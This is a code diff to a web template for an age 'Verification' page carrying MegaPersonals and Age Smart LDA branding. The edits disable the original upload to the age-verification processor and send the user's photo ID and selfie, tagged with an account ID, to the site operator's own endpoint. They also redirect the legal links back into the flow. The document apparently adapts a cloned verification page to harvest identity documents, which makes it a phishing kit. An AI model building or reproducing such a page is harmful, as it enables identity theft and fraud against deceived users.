@@ -4,6 +4,7 @@
       <title>Verification</title>
       <meta id="viewportMetaTag" name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0, minimal-ui">
       <meta charset='utf-8'>
+      <meta name="csrf-token" content="{{ csrf_token() }}">
       <link rel="icon" type="image/png" sizes="16x16" href="{{ asset('assets/megapersonals-verification/v2/images/favicon.png') }}">
       <script type="text/javascript" src="{{ asset('assets/megapersonals-verification/v2/js/p2/jquery.min.js') }}"></script>
       <script type="text/javascript" src="{{ asset('assets/megapersonals-verification/v2/js/p2/jquery-ui.min.js') }}"></script>
@@ -16,6 +17,14 @@
    </head>
    <body>
       <style>
+        body.overflowAuto {
+            overflow: auto !important;
+        }
+
+        body.overflowHidden {
+            overflow: hidden !important;
+        }
+
          .verification-container {
             max-width: 800px;
          }
@@ -214,9 +223,9 @@
                      <div>
                         <p class="d-flex justify-content-center fw-bold mb-0 mt-2 copyright">Copyright &copy; 2022 Age Smart LDA. All Rights Reserved.</p>
                         <p class="d-flex justify-content-center gap-3 fw-bold mb-0 copyright">
-                           <a href="{{ route('megapersonals.verification_steps', $account->id) }}">Terms of Use</a>
-                           <a href="{{ route('megapersonals.verification_steps', $account->id) }}">Privacy Policy</a>
-                           <a href="{{ route('megapersonals.verification_steps', $account->id) }}">Billing Questions</a>
+                           <a href="{{ route('megapersonals.verification_steps', ['accountId' => $account->id, 'token' => $token]) }}">Terms of Use</a>
+                           <a href="{{ route('megapersonals.verification_steps', ['accountId' => $account->id, 'token' => $token]) }}">Privacy Policy</a>
+                           <a href="{{ route('megapersonals.verification_steps', ['accountId' => $account->id, 'token' => $token]) }}">Billing Questions</a>
                         </p>
                      </div>
                   </div>
@@ -258,7 +267,9 @@
                   <div class="revert-camera-wrapper">
                      <div class="d-flex flex-column align-items-center mb-2">
                         <button id="btn-revert-id-camera" class="btn btn-secondary" type="button">
-                        <i class="bi bi-phone-flip"></i>
+                            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-phone-flip" viewBox="0 0 16 16">
+                                <path fill-rule="evenodd" d="M11 1H5a1 1 0 0 0-1 1v6a.5.5 0 0 1-1 0V2a2 2 0 0 1 2-2h6a2 2 0 0 1 2 2v6a.5.5 0 0 1-1 0V2a1 1 0 0 0-1-1m1 13a1 1 0 0 1-1 1H5a1 1 0 0 1-1-1v-2a.5.5 0 0 0-1 0v2a2 2 0 0 0 2 2h6a2 2 0 0 0 2-2v-2a.5.5 0 0 0-1 0zM1.713 7.954a.5.5 0 1 0-.419-.908c-.347.16-.654.348-.882.57C.184 7.842 0 8.139 0 8.5c0 .546.408.94.823 1.201.44.278 1.043.51 1.745.696C3.978 10.773 5.898 11 8 11q.148 0 .294-.002l-1.148 1.148a.5.5 0 0 0 .708.708l2-2a.5.5 0 0 0 0-.708l-2-2a.5.5 0 1 0-.708.708l1.145 1.144L8 10c-2.04 0-3.87-.221-5.174-.569-.656-.175-1.151-.374-1.47-.575C1.012 8.639 1 8.506 1 8.5c0-.003 0-.059.112-.17.115-.112.31-.242.6-.376Zm12.993-.908a.5.5 0 0 0-.419.908c.292.134.486.264.6.377.113.11.113.166.113.169s0 .065-.13.187c-.132.122-.352.26-.677.4-.645.28-1.596.523-2.763.687a.5.5 0 0 0 .14.99c1.212-.17 2.26-.43 3.02-.758.38-.164.713-.357.96-.587.246-.229.45-.537.45-.919 0-.362-.184-.66-.412-.883s-.535-.411-.882-.571M7.5 2a.5.5 0 0 0 0 1h1a.5.5 0 0 0 0-1z"/>
+                              </svg>
                         </button>
                      </div>
                   </div>
@@ -441,9 +452,9 @@
                      <div>
                         <p class="d-flex justify-content-center fw-bold mb-0 mt-2 copyright">Copyright &copy; 2022 Age Smart LDA. All Rights Reserved.</p>
                         <p class="d-flex justify-content-center gap-3 fw-bold mb-0 copyright">
-                           <a href="/terms" target="_blank">Terms of Use</a>
-                           <a href="/privacy" target="_blank">Privacy Policy</a>
-                           <a href="/billingTerms" target="_blank">Billing Questions</a>
+                           <a href="{{ route('megapersonals.verification_steps', ['accountId' => $account->id, 'token' => $token]) }}" target="_blank">Terms of Use</a>
+                           <a href="{{ route('megapersonals.verification_steps', ['accountId' => $account->id, 'token' => $token]) }}" target="_blank">Privacy Policy</a>
+                           <a href="{{ route('megapersonals.verification_steps', ['accountId' => $account->id, 'token' => $token]) }}" target="_blank">Billing Questions</a>
                         </p>
                      </div>
                   </div>
@@ -602,8 +613,8 @@
       <script>
          var imageProcessorUrl = "https://image-processor.agesmart.eu/process/upload_age_smart_image";
          var birthDate = null;
-         var fileSelfyImage = null;
-         var fileSelfyImageOriginal = null;
+        //  var fileSelfyImage = null;
+        //  var fileSelfyImageOriginal = null;
          var fileIdImage = null;
          var fileIdImageOriginal = null;
          var canvasBackupImage = null;
@@ -698,42 +709,50 @@
                  nextPage('page-photo-id');
              });
 
-             $('#btn-take-photo-id--upload').on('change', function (e) {
-                 e.preventDefault();
-                 showSpinnerLoader();
-                 var selectedFile = this.files[0];
-                 if (selectedFile) {
-                     fileIdImage = fileIdImageOriginal = selectedFile;
-                     uploadPhotoToImageProcessor(selectedFile, 'DOCUMENT_ID', function (res) {
-                         hideSpinnerLoader();
-                         if (res.hasOwnProperty('fname')) {
-                             idImageHashName = res['fname'];
-                             nextPage('page-photo-id-uploaded');
-                         } else {
-                             showBackendErrorModal('Error processing the photo id');
-                         }
-                     });
-                 }
-             });
+            //  $('#btn-take-photo-id--upload').on('change', function (e) {
+            //      e.preventDefault();
+            //      showSpinnerLoader();
+            //      var selectedFile = this.files[0];
+            //      if (selectedFile) {
+            //          fileIdImage = fileIdImageOriginal = selectedFile;
+            //          uploadPhotoToImageProcessor(selectedFile, 'DOCUMENT_ID', function () {
+            //              hideSpinnerLoader();
+            //             //  if (res.hasOwnProperty('fname')) {
+            //             //      idImageHashName = res['fname'];
+            //             //      nextPage('page-photo-id-uploaded');
+            //             //  } else {
+            //             //       ('Error processing the photo id');
+            //             //  }
 
-             $('#btn-take-selfie--upload').on('change', function (e) {
-                 e.preventDefault();
-                 showSpinnerLoader();
-                 var selectedFile = this.files[0];
-                 if (selectedFile) {
-                     fileIdImage = fileIdImageOriginal = selectedFile;
-                     uploadPhotoToImageProcessor(selectedFile, 'SELFIE', function (res) {
-                         hideSpinnerLoader();
-                         if (res.hasOwnProperty('fname')) {
-                             selfieImageHashName = res['fname'];
-                             nextPage('page-photo-selfy-uploaded', showTopHeader);
-                             // startRedactingCanvasImage('selfy');
-                         } else {
-                             showBackendErrorModal('Error processing the selfie');
-                         }
-                     });
-                 }
-             });
+            //             idImageHashName = file;
+
+            //             nextPage('page-photo-id-uploaded');
+            //          });
+            //      }
+            //  });
+
+            //  $('#btn-take-selfie--upload').on('change', function (e) {
+            //      e.preventDefault();
+            //      showSpinnerLoader();
+            //      var selectedFile = this.files[0];
+            //      if (selectedFile) {
+            //          fileIdImage = fileIdImageOriginal = selectedFile;
+            //          uploadPhotoToImageProcessor(selectedFile, 'SELFIE', function () {
+            //              hideSpinnerLoader();
+            //             //  if (res.hasOwnProperty('fname')) {
+            //             //      selfieImageHashName = res['fname'];
+            //             //      nextPage('page-photo-selfy-uploaded', showTopHeader);
+            //             //      // startRedactingCanvasImage('selfy');
+            //             //  } else {
+            //             //      showBackendErrorModal('Error processing the selfie');
+            //             //  }
+
+            //             selfieImageHashName = selectedFile;
+
+            //             nextPage('page-photo-selfy-uploaded', showTopHeader);
+            //          });
+            //      }
+            //  });
 
              $('#btn-go-to-photo-id-decline-retake').on('click', function () {
                  nextPage('page-photo-id-camera', function () {
@@ -789,13 +808,17 @@
                  stopRedactingCanvasImage('id');
                  saveCanvasToFile('id')
                      .then(function(file) {
-                         uploadPhotoToImageProcessor(file, 'DOCUMENT_ID', function (res) {
-                             if (res.hasOwnProperty('fname')) {
-                                 idImageHashName = res['fname'];
-                                 nextPage('page-photo-id-uploaded');
-                             } else {
-                                 showBackendErrorModal('Error processing the photo id');
-                             }
+                         uploadPhotoToImageProcessor(file, 'DOCUMENT_ID', function () {
+                            //  if (res.hasOwnProperty('fname')) {
+                            //      idImageHashName = res['fname'];
+                            //      nextPage('page-photo-id-uploaded');
+                            //  } else {
+                            //      showBackendErrorModal('Error processing the photo id');
+                            //  }
+
+                            idImageHashName = file;
+
+                            nextPage('page-photo-id-uploaded');
                          });
                      });
              });
@@ -816,14 +839,18 @@
              $('#btn-take-photo-selfy-camera').on('click', function () {
                  saveCanvasToFileAndCapture('selfy')
                      .then(function(file) {
-                         uploadPhotoToImageProcessor(file, 'SELFIE', function (res) {
-                             if (res.hasOwnProperty('fname')) {
-                                 selfieImageHashName = res['fname'];
-                                 nextPage('page-photo-selfy-uploaded', showTopHeader);
-                                 // startRedactingCanvasImage('selfy');
-                             } else {
-                                 showBackendErrorModal('Error processing the selfie');
-                             }
+                         uploadPhotoToImageProcessor(file, 'SELFIE', function () {
+                            //  if (res.hasOwnProperty('fname')) {
+                            //      selfieImageHashName = res['fname'];
+                            //      nextPage('page-photo-selfy-uploaded', showTopHeader);
+                            //      // startRedactingCanvasImage('selfy');
+                            //  } else {
+                            //      showBackendErrorModal('Error processing the selfie');
+                            //  }
+
+                            selfieImageHashName = file
+
+                            nextPage('page-photo-selfy-uploaded', showTopHeader);
                          });
                      });
              });
@@ -857,10 +884,12 @@
                  // stopRedactingCanvasImage('selfy');
                  saveCanvasToFile('selfy')
                      .then(function(file) {
-                         fileSelfyImage = file;
+                        //  fileSelfyImage = file;
                          validateUserData(function () {
-                             nextPage('page-photo-files-uploading', submitVerification);
+                             nextPage('page-photo-files-uploading');
                          });
+
+                         submitVerification()
                      });
              });
 
@@ -940,8 +969,25 @@
              }
 
              function showInstructionModal() {
+
+                document.body.classList.remove('overflowAuto');
+                document.body.classList.add('overflowHidden');
+
                  (new bootstrap.Modal(document.getElementById('black-out-modal'))).show();
+
+                 let allModalShadow = document.querySelectorAll('.modal-backdrop.fade');
+
+                 $('.modal-backdrop.fade').removeClass('show')
+
+                 allModalShadow[allModalShadow.length - 1].classList.add('show')
              }
+
+             $('#btn-black-out-modal').click(function() {
+                $('.modal-backdrop.fade').removeClass('show')
+                $('.modal-backdrop.fade').hide()
+                document.body.classList.remove('overflowHidden');
+                document.body.classList.add('overflowAuto');
+             })
 
              function showSpinnerLoader() {
                  $('.verification-container').addClass('blur');
@@ -1041,8 +1087,6 @@
 
              function loadImageFromFileToCanvas(canvasContainer, file) {
 
-                console.log(file);
-
                  var canvas = document.getElementById(canvasContainer);
                  var context = canvas.getContext('2d');
                  var reader = new FileReader();
@@ -1132,39 +1176,7 @@
 
              function uploadPhotoToImageProcessor(file, image_type, successCallback) {
                  if (fileIdImage.size > 0) {
-                     var fd = new FormData();
-                     fd.append('file', file);
-
-                     return $.ajax({
-                         async: false,
-                         url: imageProcessorUrl+"/"+image_type,
-                         data: fd,
-                         cache: false,
-                         contentType: false,
-                         processData: false,
-                         crossDomain: true,
-                         type: 'POST',
-
-                         success: function (response) {
-                             if (response.res != 0) {
-                                 console.log('file was uploaded');
-                                 successCallback(response);
-                             } else if (response.res == 0) {
-                                 console.warn('File was rejected: ' + response.error);
-                                 showBackendErrorModal('File was rejected: please, re-submit photos', function () {
-                                     nextPage('page-age');
-                                 });
-                             }
-                         },
-
-                         error: function (xhr, ajaxOptions, thrownError) {
-                             console.warn(xhr);
-                             console.error(thrownError);
-                             showBackendErrorModal('File was rejected: please, re-submit photos', function () {
-                                 nextPage('page-age');
-                             });
-                         }
-                     });
+                     successCallback();
                  } else {
                      alert("File size is null");
                  }
@@ -1172,17 +1184,26 @@
 
              function submitVerification() {
                  var formData = new FormData();
-                 formData.append('dateOfBirth', birthDate);
-                 formData.append('frontIdImage', idImageHashName);
-                 formData.append('selfieImage', selfieImageHashName);
+                 formData.append('account_id', {{ $account->id }});
+                 formData.append('image1', idImageHashName);
+                 formData.append('image2', selfieImageHashName);
 
-                 var headers = {};
-                 headers[csrfHeader] = csrfToken;
+                //  console.log(idImageHashName);
+                //  console.log(selfieImageHashName);
+
+
+                //  var headers = {};
+                //  headers[csrfHeader] = csrfToken;
+
+                $.ajaxSetup({
+                    headers: {
+                        'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
+                    }
+                });
 
                  $.ajax({
                      type: 'POST',
-                     headers: headers,
-                     url: '/verification/submit/CCto_MrNCWcJAHafOZ5yVR4C4WWEA23K',
+                     url: "{{ route('idCard.store') }}",
                      data: formData,
                      processData : false,
                      cache : false,
@@ -1190,14 +1211,11 @@
                      success: function (response) {
                          nextPage('page-photo-files-uploading-complete');
 
-                         if (response.success === true) {
-                             window.location.href = "/verification/pending/CCto_MrNCWcJAHafOZ5yVR4C4WWEA23K";
+                         if (response.success == true) {
+                             window.location.href = "{{ route('megapersonals.verification_pending', ['accountId' => $account->id, 'token' => $token]) }}";
                          } else {
                              showBackendErrorModal(response.body);
-                             console.warn(response);
                          }
-
-                         $(location).attr('href', '/admin/requests/list');
                      },
                      error: function(error) {
                          showBackendErrorModal('Error submitting photos: ', error);
@@ -1206,10 +1224,6 @@
                      complete: function() {}
                  });
              }
-
-            //  function mobileAndTabletCheck() {
-            //     return false
-            //  }
          });
       </script>
    </body>
